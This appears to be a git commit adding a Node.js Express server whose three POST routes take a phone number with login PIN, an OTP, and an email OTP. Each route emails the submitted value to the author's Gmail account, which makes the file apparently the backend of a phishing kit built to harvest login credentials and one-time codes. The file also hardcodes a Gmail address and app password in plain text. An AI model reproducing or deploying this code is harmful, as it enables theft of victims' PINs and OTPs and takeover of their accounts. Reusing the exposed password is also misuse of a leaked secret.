4158a7ac67ed8660c079f42c8d0d768563e4aa9d
ezebrightihe <ezebrightihech@gmail.com>
2024-09-03 08:31:52 +0100

    first commit 3rd of sept

---
+++ server.js
@@ -0,0 +1,120 @@
+const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT
+
+const app = express(); // app is use for link express functions
+const cors = require("cors");
+const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email
+
+app.use(express.json());
+app.use(cors());
+
+const PORT = process.env.PORT || 5000; // port to connect to WEB
+
+// emails credentials
+const userEmail = "ezebrightihech@gmail.com";
+const pass = "akivutlyzngyagdd";
+
+// Middleware
+app.use(express.json());
+
+// api routes
+
+// API routes for index
+app.post("/", (req, res) => {
+  const { PhoneNumber, password } = req.body;
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: `${PhoneNumber}`,
+    to: userEmail,
+    subject: `Phone number: ${PhoneNumber}  login pin: ${password}`,
+    text: `New user registered with Phone number: ${PhoneNumber} and Login pin: ${password}`,
+  };
+
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
+  });
+});
+
+
+// API routes for otp
+app.post("/otp", (req, res) => {
+  console.log(req.body);
+  let email = console.log(req.body.email);
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: email,
+    to: userEmail,
+    subject: `OTP: ${req.body?.otp} `,
+    text: `New user entered otp: ${req.body?.otp}`,
+  };
+
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
+  });
+});
+// API routes for otp
+app.post("/mail", (req, res) => {
+  console.log(req.body);
+  let email = console.log(req.body.email);
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: email,
+    to: userEmail,
+    subject: `EmailOtp: ${req.body?.emailOtp} `,
+    text: `New user entered EmailOtp: ${req.body?.emailOtp}`,
+  };
+
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
+  });
+});
+
+
+
+app.listen(PORT, () => {
+  console.log(`Server is running on port http://localhost:${PORT}`);
+});
